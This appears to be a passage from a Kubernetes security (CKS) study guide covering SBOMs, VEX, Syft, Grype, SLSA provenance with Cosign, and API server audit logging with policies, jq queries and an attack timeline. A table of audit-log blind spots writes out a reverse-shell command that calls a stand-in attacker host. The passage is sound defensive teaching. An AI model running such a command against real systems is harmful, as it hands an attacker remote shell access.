An SBOM tells you what packages are in your software. A VEX document tells you whether a CVE in those packages is actually exploitable in YOUR specific context. For example: your anihpj image contains libssl1.1 which has CVE-2023-44487 (HTTP/2 Rapid Reset DoS, CVSS 7.5). But your Django app runs behind an ALB that TERMINATES HTTP/2 — the vulnerable code path is never reached. A VEX document says: "CVE-2023-44487 in anihpj:v2 → NOT AFFECTED (HTTP/2 terminated at ALB)." This prevents false-positive driven fire drills.

SBOM + VEX = Complete Vulnerability Intelligence
  SBOM: "anihpj:v2 contains libssl1.1 1.1.1n — has CVE-2023-44487 (CVSS 7.5)"
     │  ← This alone triggers PANIC: "We have a HIGH CVE!"
     │
     ▼
  VEX: "CVE-2023-44487 in anihpj:v2 → NOT AFFECTED"
     │  ← VEX provides CONTEXT:
     │     • HTTP/2 is terminated at the ALB, not at the container
     │     • The vulnerable code path is never executed
     │     • No action needed — this is a FALSE POSITIVE in our context
     │
     ▼
  RESULT: Security team does NOT get paged. No emergency rebuild.
          VEX saved hours of investigation for a non-exploitable CVE.

  🔑 SBOM = "what's in the box" | VEX = "can it hurt us?"
     Together: actionable vulnerability intelligence, not just noise.

27.2 Generating SBOMs for anihpj Images

Three primary tools generate SBOMs for container images: Syft (by Anchore, most popular), Trivy (by Aqua, already used for CVE scanning), and Docker SBOM (built into Docker CLI). All three produce SPDX or CycloneDX output. Once generated, SBOMs should be attached to the image using Cosign and stored in the registry alongside the signature.

SBOM Generation Tools — Syft, Trivy, Docker

Bash — Generate SBOMs with Syft, Trivy, and Docker 
# ═══════════════════════════════════════════════════════════════
# SYFT (Anchore) — Most feature-rich, recommended
# ═══════════════════════════════════════════════════════════════
# Install: curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin

# Generate SPDX JSON SBOM
syft registry.anihpj.com/anihpj:v2 -o spdx-json > anihpj-v2.sbom.spdx.json

# Generate CycloneDX JSON SBOM
syft registry.anihpj.com/anihpj:v2 -o cyclonedx-json > anihpj-v2.sbom.cdx.json

# Generate table output (human-readable)
syft registry.anihpj.com/anihpj:v2 -o table

# ═══════════════════════════════════════════════════════════════
# TRIVY — Already in your pipeline for CVE scanning
# ═══════════════════════════════════════════════════════════════
# Generate CycloneDX SBOM
trivy image --format cyclonedx --output anihpj-v2.cdx.json registry.anihpj.com/anihpj:v2

# Generate SPDX SBOM
trivy image --format spdx-json --output anihpj-v2.spdx.json registry.anihpj.com/anihpj:v2

# ═══════════════════════════════════════════════════════════════
# DOCKER — Built-in, no extra tools needed
# ═══════════════════════════════════════════════════════════════
docker sbom registry.anihpj.com/anihpj:v2
docker sbom --format spdx-json registry.anihpj.com/anihpj:v2 > anihpj-v2.spdx.json

Attaching SBOMs to Images with Cosign

Bash — Generate SBOM and attach to image in CI/CD pipeline 
# ═══════════════════════════════════════════════════════════════
# Complete CI/CD step: Build → SBOM → Sign → Attach
# ═══════════════════════════════════════════════════════════════

IMAGE=registry.anihpj.com/anihpj:${{ github.sha }}

# 1. Build and push
docker build -t $IMAGE .
docker push $IMAGE

# 2. Generate SBOM with Syft
syft $IMAGE -o spdx-json > anihpj.sbom.spdx.json

# 3. Sign the image (Ch26)
cosign sign --key cosign.key $IMAGE

# 4. Attach SBOM to the image
cosign attach sbom --sbom anihpj.sbom.spdx.json $IMAGE

# 5. Verify SBOM is attached
cosign verify-attestation --key cosign.pub --type spdxjson $IMAGE
# Output: verified + shows SBOM metadata

# 6. Download SBOM from registry (for CVE impact analysis)
cosign download sbom $IMAGE > anihpj-downloaded.sbom.spdx.json

SBOM → CVE Impact Analysis — The Real Value

SBOM-Powered Vulnerability Response — From CVE to Fix in Minutes
  ┌──────────────────────────────────────────────────────────────────────────┐
  │                    SBOM-DRIVEN VULNERABILITY RESPONSE                      │
  │                                                                           │
  │  1. NEW CVE PUBLISHED: CVE-2024-xxxx in libssl1.1 (CVSS 9.8)            │
  │       │                                                                    │
  │       ▼                                                                    │
  │  2. QUERY SBOM REPOSITORY:                                                │
  │     $ grype db search CVE-2024-xxxx                                       │
  │     $ jq '.packages[] | select(.name=="libssl1.1")' anihpj-*.sbom.json   │
  │       │                                                                    │
  │       ├── "anihpj:v2" → libssl1.1 1.1.1n → AFFECTED 🔴                  │
  │       ├── "anihpj:v3" → libssl1.1 1.1.1w → NOT AFFECTED 🟢              │
  │       └── "sidecar:v1" → no libssl → NOT AFFECTED 🟢                     │
  │       │                                                                    │
  │       ▼                                                                    │
  │  3. TARGETED RESPONSE:                                                    │
  │     • Only anihpj:v2 needs rebuilding                                     │
  │     • anihpj:v3 and sidecar:v1 can stay as-is                             │
  │     • Fix time: rebuild one image (~10 min)                               │
  │     • WITHOUT SBOM: audit all images manually (~days)                     │
  └──────────────────────────────────────────────────────────────────────────┘

Grype — SBOM-Based Vulnerability Scanning

Once you have SBOMs, scan them for vulnerabilities without re-scanning the image. Grype (by Anchore, same creators as Syft) matches SBOM components against vulnerability databases:

Bash — Scan SBOM for vulnerabilities with Grype 
grype sbom:anihpj-v2.sbom.spdx.json
grype sbom:anihpj-v2.sbom.spdx.json --fail-on critical
grype sbom:anihpj-v2.sbom.spdx.json -o json > grype-results.json
# 🔑 Store SBOM once, scan many times. New CVE? Download SBOM → grype scan.

SBOM Tool Comparison — Syft vs Trivy vs Docker SBOM

FeatureSyft (Anchore)Trivy (Aqua)Docker SBOM
FormatsSPDX, CycloneDX, Syft JSON, tableCycloneDX, SPDX, Trivy JSONSPDX, CycloneDX
Speed🟢 Fastest (Go, optimized)🟡 Moderate (also does CVE scan)🟢 Fast (Docker-native)
Deepest coverage🟢 OS + Python + Node + Java + Go + Rust🟢 OS + Python + Node + Java + Go🟡 OS + Python + Node (limited)
Already installed?❌ Separate install needed✅ If using Trivy for CVE scanning✅ Built into Docker CLI (≥20.10)
Cosign integration✅ syft + cosign attach sbom✅ trivy + cosign attach sbom⚠️ Manual attachment needed
CKS exam✅ Primary — syft image -o spdx-json⚠️ Know it exists — trivy image --format cyclonedx⚠️ Know it exists — docker sbom
Best forDeepest SBOM, best Cosign integrationAlready in your pipeline for CVE scanningQuick one-off SBOM with no extra tools

SBOM Storage Strategies — Where to Keep Your SBOMs

SBOM Storage Decision — Registry vs Database vs Both
  I have SBOMs for my images — where should I store them?
  │
  ├─ OPTION 1: Attach to image in OCI registry (cosign attach sbom)
  │  ✅ SBOM travels WITH the image — always available
  │  ✅ Immutable — same digest, same SBOM
  │  ❌ Hard to query across images ("find all images with log4j")
  │  Best for: individual image verification, audit trail
  │
  ├─ OPTION 2: Store in SBOM database (Dependency-Track, OWASP)
  │  ✅ Query across ALL images — "show me every image with libssl1.1"
  │  ✅ Trend analysis — "are our SBOMs getting better or worse?"
  │  ❌ Requires additional infrastructure
  │  Best for: CVE impact analysis, compliance reporting
  │
  ├─ OPTION 3: Both (registry + database) — RECOMMENDED
  │  ✅ Attach to image for provenance (audit trail)
  │  ✅ Also upload to database for cross-image queries
  │  Best for: production environments with compliance requirements
  │
  └─ OPTION 4: Git repository (for development)
     ✅ Version-controlled, easy to diff
     ❌ Not suitable for production (SBOMs belong with images)

Grype — SBOM-Based Vulnerability Scanning

Once you have SBOMs, you can scan them for vulnerabilities without re-scanning the image. Grype (by Anchore, same creators as Syft) takes an SBOM file and matches every component against vulnerability databases. This is faster than Trivy image scanning because the SBOM has already done the package inventory work:

Bash — Scan SBOM for vulnerabilities with Grype 
# Install Grype
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh

# Scan an SBOM file (faster than image scan)
grype sbom:anihpj-v2.sbom.spdx.json

# Scan with severity filter
grype sbom:anihpj-v2.sbom.spdx.json --fail-on critical

# Output as JSON for pipeline processing
grype sbom:anihpj-v2.sbom.spdx.json -o json > grype-results.json

# 🔑 KEY ADVANTAGE: Store SBOM once, scan many times
#    • Generate SBOM in CI/CD → attach to image
#    • When new CVE drops: download SBOM → grype scan
#    • No need to re-pull or re-scan the full image

27.3 SLSA — Supply Chain Levels for Software Artifacts

SLSA (pronounced "salsa") is a security framework from Google and the OpenSSF that defines four levels of supply chain integrity. Each level builds on the previous one, providing increasing guarantees that your software hasn't been tampered with between source code and deployment. SLSA is to software supply chains what seatbelts → airbags → crumple zones are to car safety: progressive, layered protections.

The Four SLSA Levels — Progressive Supply Chain Integrity

LevelNameRequirementsWhat It Preventsanihpj Status
0 None No guarantees. Build may be entirely undocumented. Nothing. Any compromise goes undetected. Starting point 🔴
1 Provenance Exists Build process produces provenance (who, what, how, when). Provenance is NOT signed, NOT verified. Honest mistakes. Accidental misconfigurations. Syft SBOM generated 🟡
2 Hosted Build Platform Build runs on a hosted platform (GitHub Actions, GCB). Provenance is SIGNED and VERIFIABLE. Source + build are version-controlled. Tampering after the build. Unsigned provenance modifications. GitHub Actions + cosign attest ✅
3 Hardened Builds Isolated, ephemeral build environment. Builds are hermetic (no network, deterministic). Two-person review required. Compromised build platform. Insider threats. Cache poisoning. Future goal 🟡

SLSA Level 2 for anihpj — Implementation with GitHub Actions + Cosign

SLSA Level 2 Pipeline — Signed Provenance for Every Build
  ┌──────────────────────────────────────────────────────────────────────────┐
  │                    SLSA LEVEL 2 — anihpj BUILD PIPELINE                    │
  │                                                                           │
  │  ┌─────────────────┐                                                     │
  │  │  Source Code    │  github.com/anihsj/anihpj@main                      │
  │  │  (versioned)    │  Commit: abc123def456                               │
  │  └────────┬────────┘                                                     │
  │           │                                                                │
  │           ▼                                                                │
  │  ┌──────────────────────────────────────────────────────────────────┐    │
  │  │  BUILD PLATFORM (GitHub Actions — hosted, ephemeral)              │    │
  │  │                                                                   │    │
  │  │  1. Checkout source at specific commit SHA                       │    │
  │  │  2. docker build → anihpj image                                  │    │
  │  │  3. Trivy scan → verify no CRITICAL CVEs                         │    │
  │  │  4. docker push → registry                                       │    │
  │  │  5. syft → generate SBOM (SPDX)                                  │    │
│  │  6. cosign attest → SIGN the SLSA provenance                       │    │
│  │     Predicate: {                                                    │    │
│  │       builder: "GitHub Actions",                                    │    │
│  │       buildType: "docker build",                                    │    │
│  │       source: "github.com/anihsj/anihpj@abc123def",                │    │
│  │       materials: [SBOM, Dockerfile, ...]                           │    │
│  │     }                                                               │    │
│  │  7. cosign sign → cryptographically sign the image                 │    │
│  └──────────────────────────────────────────────────────────────────┘    │
│           │                                                                │
│           ▼                                                                │
│  ┌──────────────────────────────────────────────────────────────────┐    │
│  │  VERIFICATION (Kyverno at admission time)                         │    │
│  │  • verifyImages: cosign signature valid? ✅                       │    │
│  │  • verifyImages attestations: SLSA provenance valid? ✅           │    │
│  │  • Check: builder identity = GitHub Actions anihsj/anihpj? ✅     │    │
│  │  • Check: source commit = known good commit? ✅                   │    │
│  └──────────────────────────────────────────────────────────────────┘    │
│                                                                           │
│  🔑 SLSA Level 2 GUARANTEES:                                               │
│  • The image was built by GitHub Actions (not a random machine)           │
│  • The image was built from a specific, version-controlled commit         │
│  • The provenance is signed and cannot be forged                          │
│  • You can trace ANY running pod back to its exact source code commit     │
└──────────────────────────────────────────────────────────────────────────┘

Generating SLSA Provenance with Cosign Attest

Bash — Generate and attach SLSA provenance in CI/CD 
# ═══════════════════════════════════════════════════════════════
# Step 1: Generate SLSA provenance predicate (JSON)
# ═══════════════════════════════════════════════════════════════
cat > slsa-provenance.json << 'EOF'
{
  "builder": {
    "id": "https://github.com/anihsj/anihpj/.github/workflows/build.yml@refs/heads/main"
  },
  "buildType": "https://github.com/actions/runner@v1",
  "invocation": {
    "configSource": {
      "uri": "git+https://github.com/anihsj/anihpj",
      "digest": {"sha1": "${{ github.sha }}"},
      "entryPoint": ".github/workflows/build.yml"
    }
  },
  "materials": [
    {
      "uri": "git+https://github.com/anihsj/anihpj",
      "digest": {"sha1": "${{ github.sha }}"}
    }
  ]
}
EOF

# ═══════════════════════════════════════════════════════════════
# Step 2: Sign and attach SLSA provenance as in-toto attestation
# ═══════════════════════════════════════════════════════════════
cosign attest --key cosign.key \
  --predicate slsa-provenance.json \
  --type slsaprovenance \
  registry.anihpj.com/anihpj:${{ github.sha }}

# ═══════════════════════════════════════════════════════════════
# Step 3: Verify SLSA attestation (in Kyverno or locally)
# ═══════════════════════════════════════════════════════════════
cosign verify-attestation --key cosign.pub \
  --type slsaprovenance \
  registry.anihpj.com/anihpj:${{ github.sha }}

SLSA Threat Model — What Each Level Defends Against

SLSA Threat Model — Attack Vectors Blocked at Each Level
  LEVEL 0 — No defenses: source mods → build → deploy, all undetected
  LEVEL 1 — 🛡️ Catches honest mistakes. ❌ Provenance can be forged (unsigned).
  LEVEL 2 — 🛡️ Provenance cryptographically signed. 🛡️ Platform identity verified.
  LEVEL 3 — 🛡️ Isolated + hermetic + deterministic. Defends against insider threats.

SLSA Level 2 Practical Checklist — anihpj Implementation

RequirementImplementationStatus
Version-controlled sourceGitHub + branch protection + PR reviews✅
Hosted build platformGitHub Actions, ephemeral runners✅
Signed provenancecosign attest with SLSA predicate✅
Build as codeWorkflow YAML versioned with source✅
Ephemeral environmentFresh runner per build, no shared state✅
IsolationNo cross-build cache or volume sharing⚠️

📊 Chapter 27 Visual Summary — SBOM & SLSA at a Glance

📋
SBOM (27.1)

Nutrition label for software. Lists every OS package, language dependency, and transitive library with versions. SPDX (license-focused) and CycloneDX (security-focused) formats. Turns CVE response from days to seconds.

🔧
Generation (27.2)

Syft, Trivy, or Docker. Generate SPDX/CycloneDX SBOMs in CI/CD. Attach to image with cosign attach sbom. Query SBOMs for instant CVE impact analysis.

🏗️
SLSA (27.3)

4 levels of supply chain integrity. Level 1: provenance exists. Level 2: hosted + signed. Level 3: hardened + hermetic. Cosign attest generates signed SLSA provenance.

💡 Key Takeaway for the CKS Exam

The CKS exam expects you to understand SBOM and SLSA as the final supply chain security concepts. Know: (1) SBOM generation: syft <image> -o spdx-json or trivy image --format cyclonedx <image>. (2) Attach SBOM: cosign attach sbom --sbom <file> <image>. (3) SLSA levels: 0=none, 1=provenance, 2=hosted+signed, 3=hardened+hermetic. (4) SLSA attestation: cosign attest --key cosign.key --predicate slsa-provenance.json --type slsaprovenance <image>. (5) SBOM + SLSA together enable complete supply chain transparency: know what's in your software AND prove how it was built.

Chapter 28: Kubernetes Audit Logging — Every API Call Recorded

Imagine a security incident: at 3:14 AM, someone created a privileged pod in the anihpj namespace, exec'd into it, and exfiltrated the Django SECRET_KEY and DATABASE_URL. Your RBAC rules were bypassed, your admission controllers were circumvented, and your runtime detection didn't fire. How do you even know this happened? The answer is Kubernetes Audit Logging: a chronological, tamper-evident record of EVERY request made to the API server — who made it, what they did, when, from where, and whether it succeeded. Audit logs are your black box flight recorder for Kubernetes. They don't prevent attacks — they ensure that when an attack happens, you can reconstruct exactly what occurred, prove it to auditors, and improve your defenses. Required by PCI-DSS, SOC 2, HIPAA, and GDPR for any production Kubernetes cluster.

🟡 Intermediate ⏱️ ~2 hours 📝 Audit Logging 🔍 Monitoring

  • ✅ Audit policy deep dive: The first-match-wins algorithm, namespace/user/verb/resource targeting, nonResourceURLs, omitStages, and a decision tree for choosing audit levels
  • ✅ Log analysis mastery: jq patterns for every security scenario, log rotation internals, structured vs unstructured analysis, tracing an attacker's complete path
  • ✅ External shipping: Webhook vs log backends, buffering/batching modes, TLS mutual auth, multi-destination routing
  • ✅ Threat detection patterns: 8 red-flag audit patterns with jq queries, SIEM alerting integration, real-time vs batch detection trade-offs

28.1 What Is Audit Logging and Why Is It Non-Negotiable?

Kubernetes audit logging is a chronological record of every authenticated request made to the API server. Every kubectl apply, every kubectl exec, every controller reconciliation, every kubelet heartbeat — captured as a structured JSON event with timestamp, user identity, source IP, target resource, HTTP verb, and response code. Without audit logs, a security incident leaves no trace. With audit logs, you can replay the attack step by step.

How Audit Logging Works Inside the API Server — The 4 Stages

Audit Event Lifecycle — 4 Stages from Request Arrival to Completion
  ┌──────────────────────────────────────────────────────────────────────────┐
  │                    AUDIT STAGES IN THE API SERVER                          │
  │                                                                           │
  │  kubectl get secrets                                                     │
  │       │                                                                    │
  │       ▼                                                                    │
  │  ┌─────────────────────────────────────────────────────────────────┐     │
  │  │  STAGE 1: RequestReceived — Request arrives at API server       │     │
  │  │  • Timestamp: requestReceivedTimestamp                          │     │
  │  │  • Contains: user, verb, resource, sourceIP (NO response yet)  │     │
  │  │  • Policy level: at least Metadata needed to capture this      │     │
  │  └─────────────────────────────────────────────────────────────────┘     │
  │       │                                                                    │
  │       │ AuthN → AuthZ → Admission                                         │
  │       ▼                                                                    │
  │  ┌─────────────────────────────────────────────────────────────────┐     │
  │  │  STAGE 2: ResponseStarted — Response headers sent               │     │
  │  │  • Only generated for long-running requests (watch)            │     │
  │  │  • Timestamp: responseStartedTimestamp                          │     │
  │  │  • Useful for: detecting hung requests                          │     │
  │  └─────────────────────────────────────────────────────────────────┘     │
  │       │                                                                    │
  │       │ Request processed → Response body generated                       │
  │       ▼                                                                    │
  │  ┌─────────────────────────────────────────────────────────────────┐     │
  │  │  STAGE 3: ResponseComplete — Response fully sent                │     │
  │  │  • Most audit events captured HERE                              │     │
  │  │  • Contains: responseStatus.code, requestObject, responseObject  │     │
  │  │  • Timestamp: stageTimestamp                                    │     │
  │  │  • Policy level: RequestResponse needed for full body capture   │     │
  │  └─────────────────────────────────────────────────────────────────┘     │
  │       │                                                                    │
  │       │ (Rare: panic during request handling)                             │
  │       ▼                                                                    │
  │  ┌─────────────────────────────────────────────────────────────────┐     │
  │  │  STAGE 4: Panic — API server panicked during request            │     │
  │  │  • Generated when a goroutine panics during handling            │     │
  │  │  • Contains: panic stack trace                                  │     │
  │  │  • Always logged regardless of audit policy                     │     │
  │  └─────────────────────────────────────────────────────────────────┘     │
  │                                                                           │
  │  🔑 Use omitStages in the policy to suppress specific stages             │
  │     (e.g., omitStages: ["RequestReceived"] to only log final events)     │
  └──────────────────────────────────────────────────────────────────────────┘

🔴 INCIDENT SCENARIO: How Audit Logs Reconstruct an Attack

3:14 AM Attack — Reconstructed from Audit Logs
  03:14:01  user=sa:anihpj:deployer  verb=create  resource=pods
            response=201  sourceIP=203.0.113.42
            → Pod "crypto-miner" created with privileged=true 🚨
  03:14:05  user=sa:anihpj:deployer  verb=create  resource=pods/exec
            response=101 (WebSocket upgrade)
            → Attacker exec'd into the pod 🚨
  03:14:12  user=sa:anihpj:deployer  verb=get  resource=secrets
            name=anihpj-db-creds  response=200
            → Database credentials read 🚨
  03:14:18  user=sa:anihpj:deployer  verb=get  resource=configmaps
            name=django-settings  response=200
            → Django SECRET_KEY read 🚨
  03:15:00  user=sa:anihpj:deployer  verb=delete  resource=pods
            name=crypto-miner  response=200
            → Attacker deleted the pod to cover tracks 🚨

  🔑 WITHOUT AUDIT LOGS: You'd never know. WITH: Full forensic reconstruction.

Audit Backend Types — Log File vs Webhook

FeatureLog BackendWebhook Backend
OutputJSON Lines to local fileHTTP POST to external endpoint
RetentionLocal disk (rotated via maxage/maxsize)External system (SIEM, log aggregator)
Reliability✅ Always available (local disk)⚠️ Depends on network + remote service
ModeN/A (always async I/O)batch (async) or blocking (sync)
Real-time alerting❌ Requires separate log shipper✅ SIEM can alert in real-time
CKS exam✅ Primary — audit-log-path⚠️ Know webhook config structure

Compliance Framework Mapping — Which Standard Requires What

FrameworkAudit Logging RequirementKubernetes Implementation
PCI-DSS 10.2Log all access to cardholder dataAudit secrets + configmaps at RequestResponse level
SOC 2 CC7.2Monitor system changes for anomaliesAudit RBAC changes, pod mutations, exec events
HIPAA 164.312(b)Record access to ePHI systemsAudit all access to namespaces containing PHI data
GDPR Art. 30Records of processing activitiesAudit logs serve as processing activity records

What Audit Logs CANNOT See — Understanding the Blind Spots

Audit logs are comprehensive at the API level, but they have critical blind spots you must understand for the CKS exam:

What HappensDoes Audit Log See It?Which Tool Covers This Gap?
Attacker runs cat /etc/shadow inside a container after exec❌ NO — happens INSIDE the container, not via API🦅 Falco (Ch29) — detects file reads at syscall level
Attacker spawns a reverse shell: nc -e /bin/bash attacker.com 4444❌ NO — process execution inside container🦅 Falco — detects spawned_process and network connections
Container writes to /etc/crontab for persistence❌ NO — filesystem writes inside container🦅 Falco — "Write below etc" rule
Attacker modifies a running pod's environment through /proc❌ NO — kernel-level manipulation🦅 Falco + seccomp (Ch15) — syscall filtering
Data exfiltration via DNS tunneling❌ NO — DNS queries don't touch API🦅 Falco + NetworkPolicy (Ch6) — network monitoring

Key insight: Audit logs + Falco = complete visibility. Audit tells you HOW they got in. Falco tells you WHAT they're doing now. Neither alone is sufficient.

28.2 Configuring an Audit Policy — CKS Exam Must-Know

The audit policy is a YAML file that defines what gets logged and at what level. Rules are evaluated in order — first match wins. More specific rules must come before general rules. The policy is loaded by the API server via --audit-policy-file.

Audit Levels — How Much Detail to Capture

LevelWhat It LogsUse CasePerformance
NoneNothing loggedSystem noise (kubelet heartbeats)None
MetadataWho, what, when, response codeMost requests — default levelLow
RequestMetadata + request bodyPod specs in create/updateMedium
RequestResponseMetadata + request + response bodySecrets, RBAC, exec — maximum visibilityHigh

Decision Tree — Choosing the Right Audit Level

Audit Level Selection — What Level for Which Resource?
  START: What resource is being accessed?
  │
  ├─ Is it a system component heartbeat? (kubelet, kube-proxy)
  │  └─ level: None (suppress noise, save disk)
  │
  ├─ Does it involve SECRET data? (secrets, configmaps with credentials)
  │  └─ level: RequestResponse (you need to see WHO accessed WHAT value)
  │
  ├─ Does it change RBAC permissions? (roles, clusterroles, bindings)
  │  └─ level: RequestResponse (privilege escalation is highest priority)
  │
  ├─ Does it involve pod exec/portforward/attach?
  │  └─ level: RequestResponse (interactive shell access must be fully logged)
  │
  ├─ Does it MUTATE workloads? (pod create/update/delete, deployment changes)
  │  └─ level: Request (see what was created, but skip large response bodies)
  │
  └─ Everything else (reads, lists, watches of non-sensitive resources)
     └─ level: Metadata (who accessed what, when — sufficient for audit trail)

CKS-Ready Audit Policy — Complete Production Template

YAML — /etc/kubernetes/audit-policy.yaml — CKS exam-ready audit policy 
apiVersion: audit.k8s.io/v1
kind: Policy
# FIRST MATCH WINS — most specific rules first!
omitStages: ["RequestReceived"]  # Only log final response events
rules:
  # ── SUPPRESS: System noise ──
  - level: None
    users: ["system:kube-proxy", "system:nodes"]
    verbs: ["get", "list", "watch"]
    resources:
    - group: ""
      resources: ["endpoints", "services", "nodes", "nodes/status"]

  # ── CRITICAL: Secrets at RequestResponse ──
  - level: RequestResponse
    resources:
    - group: ""
      resources: ["secrets"]

  # ── CRITICAL: RBAC changes ──
  - level: RequestResponse
    resources:
    - group: "rbac.authorization.k8s.io"
      resources: ["clusterroles", "clusterrolebindings", "roles", "rolebindings"]

  # ── CRITICAL: Pod exec/portforward/attach ──
  - level: RequestResponse
    resources:
    - group: ""
      resources: ["pods/exec", "pods/portforward", "pods/attach"]

  # ── IMPORTANT: Pod mutations at Request ──
  - level: Request
    resources:
    - group: ""
      resources: ["pods"]
    verbs: ["create", "update", "patch", "delete"]

  # ── DEFAULT: Everything else at Metadata ──
  - level: Metadata

API Server Configuration — Enabling Audit Logging with Rotation

YAML — kube-apiserver.yaml flags for audit logging with log rotation 
# /etc/kubernetes/manifests/kube-apiserver.yaml
spec:
  containers:
  - name: kube-apiserver
    command:
    - kube-apiserver
    # ── AUDIT FLAGS ──
    - --audit-policy-file=/etc/kubernetes/audit-policy.yaml
    - --audit-log-path=/var/log/kubernetes/audit.log
    - --audit-log-maxage=30        # Days to retain
    - --audit-log-maxbackup=10     # Max rotated files
    - --audit-log-maxsize=100      # MB per file before rotation
    # ── WEBHOOK (optional, for SIEM) ──
    - --audit-webhook-config-file=/etc/kubernetes/audit-webhook.yaml
    - --audit-webhook-mode=batch   # batch=async | blocking=sync
    volumeMounts:
    - name: audit-policy
      mountPath: /etc/kubernetes/audit-policy.yaml
      readOnly: true
    - name: audit-log
      mountPath: /var/log/kubernetes
  volumes:
  - name: audit-policy
    hostPath:
      path: /etc/kubernetes/audit-policy.yaml
      type: File
  - name: audit-log
    hostPath:
      path: /var/log/kubernetes
      type: DirectoryOrCreate

CKS Exam Common Mistakes — What Trips Up Candidates

⚠️ Top 5 Audit Policy Mistakes on the CKS Exam

1. Forgetting existing plugins: When adding --audit-policy-file, you must also include --audit-log-path and the volume mounts. All three are needed — missing any one means audit logging won't work. 2. Wrong rule order: Putting the catch-all level: Metadata rule FIRST means NO rules after it will ever match. Always put the default rule LAST. 3. Using RequestResponse for everything: This floods the audit log with response bodies (potentially megabytes each). Use RequestResponse ONLY for secrets, RBAC, and exec. 4. Not excluding system noise: Without a level: None rule for kubelet/kube-proxy heartbeats, your audit log fills with thousands of useless events per minute. 5. Forgetting volume mounts: The API server manifest needs BOTH the --audit-policy-file flag AND the volume mount to make the policy file accessible inside the container.

Policy Rule Matching Walkthrough — Exactly How First-Match-Wins Works

Step-by-Step: How the API Server Evaluates Audit Policy Rules
  REQUEST: kubectl get secret anihpj-db-creds -n anihpj
  ─────────────────────────────────────────────────────

  API server iterates through rules IN ORDER:

  RULE 1: level=None, users=[system:kube-proxy, system:nodes]
    → User is "system:serviceaccount:anihpj:deployer"
    → Does NOT match users list → SKIP to next rule

  RULE 2: level=RequestResponse, resources=[secrets]
    → Resource IS "secrets" → MATCH!
    → Audit event generated at RequestResponse level
    → STOP evaluating (first match wins!)

  RULES 3-7: NEVER EVALUATED (already matched at Rule 2)

  ─────────────────────────────────────────────────────
  REQUEST: kubectl get pods -n anihpj

  RULE 1: Does NOT match (wrong user)
  RULE 2: Does NOT match (resource is pods, not secrets)
  RULE 3: Does NOT match (resource is pods, not RBAC)
  ...
  RULE 7 (DEFAULT): level=Metadata, no restrictions
    → Everything matches → Audit at Metadata level
    → STOP evaluating

  🔑 If the DEFAULT rule were FIRST, it would match EVERYTHING
     and NO other rules would ever be evaluated. This is the
     most common CKS exam mistake.

28.3 Reading and Analyzing Audit Logs

Audit logs are JSON Lines (one JSON object per line) at /var/log/kubernetes/audit.log. Each line is a complete, self-contained audit event. You analyze them with jq, grep, or a SIEM.

jq Query Patterns — Security Event Extraction

Bash — jq queries for every security analysis scenario 
# ── Secret access ──
cat audit.log | jq 'select(.objectRef.resource=="secrets")'

# ── Failed requests (attack probes) ──
cat audit.log | jq 'select(.responseStatus.code >= 400)'

# ── Pod exec events ──
cat audit.log | jq 'select(.objectRef.subresource=="exec")'

# ── RBAC changes ──
cat audit.log | jq 'select(.objectRef.apiGroup=="rbac.authorization.k8s.io")'

# ── Events from specific user ──
cat audit.log | jq 'select(.user.username=="system:serviceaccount:anihpj:deployer")'

# ── Key fields only (clean output) ──
cat audit.log | jq '{time: .stageTimestamp, user: .user.username, verb, resource: .objectRef.resource, ns: .objectRef.namespace, code: .responseStatus.code, ip: .sourceIPs[0]}'

# ── Time window ──
cat audit.log | jq 'select(.stageTimestamp >= "2026-06-14T03:00:00Z" and .stageTimestamp <= "2026-06-14T04:00:00Z")'

# ── Privilege escalation ──
cat audit.log | jq 'select(.objectRef.resource=="clusterrolebindings" or .objectRef.resource=="rolebindings")'

# ── Count events by user (anomaly detection) ──
cat audit.log | jq -r '.user.username' | sort | uniq -c | sort -rn

Tracing an Attack — From Alert to Full Reconstruction

1Start with the alert

Falco detected shell spawn in "crypto-miner" at 03:14:05. Note pod name + namespace.

2Query for pod creation

jq 'select(.verb=="create" and .objectRef.resource=="pods" and .objectRef.name=="crypto-miner")' → reveals who, when, source IP.

3Follow the user's trail

Query ALL events from that user in the time window → exec, secret reads, configmap access, pod deletion.

4Build the timeline

Sort chronologically. Document: who, what, when, from where. This IS your incident report.

5Fix root cause

How did the SA get pod creation? Why wasn't admission blocking it? Fix RBAC, admission, monitoring.

Real Audit Event — Annotated Walkthrough

Following the Trail — How One Audit Event Connects to the Next
  EVENT 1 (03:14:01): POD CREATION
  ┌─────────────────────────────────────────────────────────────┐
  │  {                                                           │
  │    "verb": "create",                  ← What they did       │
  │    "objectRef": {                                            │
  │      "resource": "pods",              ← What resource       │
  │      "name": "crypto-miner",          ← Name of the pod     │
  │      "namespace": "anihpj"            ← Which namespace    │
  │    },                                                        │
  │    "user": {                                                 │
  │      "username": "sa:anihpj:deployer", ← WHO (critical!)   │
  │      "groups": ["system:serviceaccounts"]                   │
  │    },                                                        │
  │    "sourceIPs": ["203.0.113.42"],     ← WHERE from         │
  │    "responseStatus": {"code": 201}    ← Created (success)  │
  │  }                                                           │
  └─────────────────────────────────────────────────────────────┘
  │  This tells us: "SA deployer created pod crypto-miner from
  │  external IP 203.0.113.42." Suspicious — deployer SA should
  │  only be used by CI/CD, not from external IPs.
  │
  ▼ NOW QUERY: Everything this user did in the next 5 minutes
  │  jq 'select(.user.username=="sa:anihpj:deployer" and
  │      .stageTimestamp >= "03:14:00Z" and
  │      .stageTimestamp <= "03:20:00Z")'
  │  → Returns: exec, secret read, configmap read, pod delete
  │
  ▼ FULL ATTACK TIMELINE RECONSTRUCTED from 4 correlated events

28.4 Shipping Audit Logs to External Systems

Local files suffice for the CKS exam. In production, ship audit logs off-node to a SIEM for retention, alerting, and correlation. The API server supports a webhook backend that streams events via HTTPS in real time.

Webhook Backend Configuration — Streaming to Elasticsearch

YAML — /etc/kubernetes/audit-webhook.yaml — Webhook backend for SIEM streaming 
apiVersion: v1
kind: Config
clusters:
- name: elasticsearch
  cluster:
    server: https://elasticsearch.logging.svc:9200/_bulk
    certificate-authority: /etc/kubernetes/elasticsearch-ca.crt
users:
- name: audit-webhook
  user:
    client-certificate: /etc/kubernetes/audit-webhook-client.crt
    client-key: /etc/kubernetes/audit-webhook-client.key
contexts:
- name: default
  context:
    cluster: elasticsearch
    user: audit-webhook
current-context: default

Batch vs Blocking Mode — Performance Trade-off

batch (async)
--audit-webhook-mode=batch

• Events buffered and sent in batches
• API requests NOT delayed by webhook
• If webhook is DOWN → events queued
• If buffer fills → events DROPPED ⚠️
• RECOMMENDED for production
